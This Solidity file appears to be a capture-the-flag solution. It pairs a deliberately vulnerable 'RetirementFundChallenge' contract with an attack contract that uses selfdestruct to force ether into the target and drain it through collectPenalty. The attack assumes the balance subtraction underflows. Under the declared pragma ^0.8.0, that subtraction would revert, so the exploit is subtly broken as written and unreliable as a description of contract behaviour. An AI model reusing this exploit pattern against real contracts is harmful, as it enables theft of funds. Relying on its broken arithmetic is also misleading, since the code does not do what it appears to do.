pragma solidity ^0.8.0;

contract RetirementFundChallenge {
    uint256 startBalance;
    address owner = msg.sender;
    address beneficiary;
    uint256 expiration = block.timestamp + 60*60*24*365*10;

    constructor(address player) payable {
        require(msg.value == 1 ether);

        beneficiary = player;
        startBalance = msg.value;
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function withdraw() public {
        require(msg.sender == owner);

        if (block.timestamp < expiration) {
            // early withdrawal incurs a 10% penalty
            payable(msg.sender).transfer(address(this).balance * 9 / 10);
        } else {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    function collectPenalty() public {
        require(msg.sender == beneficiary);

        uint256 withdrawn = startBalance - address(this).balance;

        // an early withdrawal occurred
        require(withdrawn > 0);

        // penalty is what's left
        payable(msg.sender).transfer(address(this).balance);
    }
}


contract RetirementFundAttack {

    constructor(address payable _retirementFund) payable {
        require(msg.value > 0);
        selfdestruct(_retirementFund);
    }

}